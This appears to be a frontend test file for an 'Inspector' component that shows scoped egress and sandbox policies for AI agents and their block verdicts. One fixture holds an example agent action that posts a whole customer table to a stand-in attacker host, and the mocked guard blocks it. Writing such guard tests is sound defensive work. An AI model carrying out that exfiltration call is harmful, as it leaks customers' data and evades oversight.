import { afterEach, describe, expect, it, vi } from "vitest";
import { fireEvent, render, screen, waitFor } from "@testing-library/react";
import { Inspector } from "./Inspector";

const EXAMPLE_BODY = {
  document: {
    templates: {
      egress_allowlist: {
        detector: "data_egress",
        factory: "network_egress_guard",
        union_params: ["allowed_hosts"],
      },
      sandbox_limits: { containment: true },
    },
    bindings: {
      root: [{ template_id: "egress_allowlist", params: { allowed_hosts: ["api.internal"] } }],
      "root/acme": [{ template_id: "egress_allowlist", params: { allowed_hosts: ["api.acme.com"] } }],
      "root/acme/agent42": [{ template_id: "sandbox_limits", params: { cpu_seconds: 5 } }],
      "root/globex/bot1": [],
    },
  },
  principal: "root/acme/agent42",
  event: {
    action: "http_post",
    args: { url: "https://evil.example/collect", body: "the whole customer table" },
  },
};

const RESOLVE_BODY = {
  scope: ["root", "acme", "agent42"],
  scope_backend: "tree",
  resolved: {
    egress_allowlist: { allowed_hosts: ["api.acme.com", "api.internal"] },
    sandbox_limits: { cpu_seconds: 5 },
  },
  sandbox: {
    profile: {
      read_paths: [],
      write_paths: [],
      allow_network: true,
      allowed_hosts: ["api.acme.com", "api.internal"],
      env_keys: [],
      cpu_seconds: 5,
      memory_mb: null,
      unshare_pid: true,
      workdir: null,
    },
    backend: "noop",
    enforced: [],
    not_enforced: ["cpu_seconds", "memory_mb", "network", "paths"],
    available_backends: ["noop"],
  },
  decision: {
    index: 0,
    verdict: "BLOCK",
    verdict_code: 1,
    reason: "evil.example is not an allowed host",
    policy_id: "data_egress",
    attributed_to: "args",
    modified_args: null,
    modified_result: null,
  },
};

function stubFetch(overrides: Record<string, unknown> = {}) {
  vi.stubGlobal(
    "fetch",
    vi.fn().mockImplementation((url: string) => {
      if (url === "/api/scopes/example") {
        return Promise.resolve({ ok: true, json: async () => EXAMPLE_BODY });
      }
      if (url === "/api/scopes/resolve") {
        if (overrides.resolveError) {
          return Promise.resolve({
            ok: false,
            json: async () => ({
              error: { code: "delegation_over_grant", message: "root/acme/agent42 would hold more than its delegator" },
            }),
          });
        }
        return Promise.resolve({ ok: true, json: async () => RESOLVE_BODY });
      }
      return Promise.resolve({
        ok: false,
        json: async () => ({ error: { code: "not_found", message: "no such route" } }),
      });
    })
  );
}

afterEach(() => {
  vi.unstubAllGlobals();
});

describe("Inspector", () => {
  it("loads the example document, principal and event into the editors", async () => {
    stubFetch();
    render(<Inspector />);

    await waitFor(() => {
      expect((screen.getByTestId("principal-input") as HTMLInputElement).value).toBe(
        "root/acme/agent42"
      );
    });
    expect((screen.getByTestId("scope-doc-editor") as HTMLTextAreaElement).value).toContain(
      "egress_allowlist"
    );
    expect((screen.getByTestId("scope-event-editor") as HTMLTextAreaElement).value).toContain(
      "http_post"
    );
  });

  it("resolves and renders the resolved templates, sandbox profile, backend, tokens and verdict", async () => {
    stubFetch();
    render(<Inspector />);

    await waitFor(() => {
      expect((screen.getByTestId("principal-input") as HTMLInputElement).value).toBe(
        "root/acme/agent42"
      );
    });
    fireEvent.click(screen.getByTestId("resolve-button"));

    await waitFor(() => {
      expect(screen.getAllByTestId("resolved-template")).toHaveLength(2);
    });
    expect(screen.getByTestId("sandbox-profile").textContent).toContain("api.internal");
    expect(screen.getByTestId("backend-name").textContent).toBe("noop");
    expect(screen.getByTestId("enforced-tokens")).toBeTruthy();
    expect(screen.getByTestId("not-enforced-tokens").textContent).toContain("network");
    expect(screen.getByTestId("scope-verdict").textContent).toBe("BLOCK");
  });

  it("shows scope-error with the error code and message on a failed resolve", async () => {
    stubFetch({ resolveError: true });
    render(<Inspector />);

    await waitFor(() => {
      expect((screen.getByTestId("principal-input") as HTMLInputElement).value).toBe(
        "root/acme/agent42"
      );
    });
    fireEvent.click(screen.getByTestId("resolve-button"));

    await waitFor(() => {
      const error = screen.getByTestId("scope-error");
      expect(error.textContent).toContain("delegation_over_grant");
      expect(error.textContent).toContain("would hold more than its delegator");
    });
  });

  it("shows scope-error without calling the API when the document is not valid JSON", async () => {
    stubFetch();
    render(<Inspector />);
    const fetchMock = vi.mocked(fetch);

    await waitFor(() => {
      expect((screen.getByTestId("principal-input") as HTMLInputElement).value).toBe(
        "root/acme/agent42"
      );
    });
    fetchMock.mockClear();
    fireEvent.change(screen.getByTestId("scope-doc-editor"), { target: { value: "{not json" } });
    fireEvent.click(screen.getByTestId("resolve-button"));

    expect(screen.getByTestId("scope-error").textContent).toContain("bad_document");
    expect(fetchMock).not.toHaveBeenCalledWith("/api/scopes/resolve", expect.anything());
  });
});
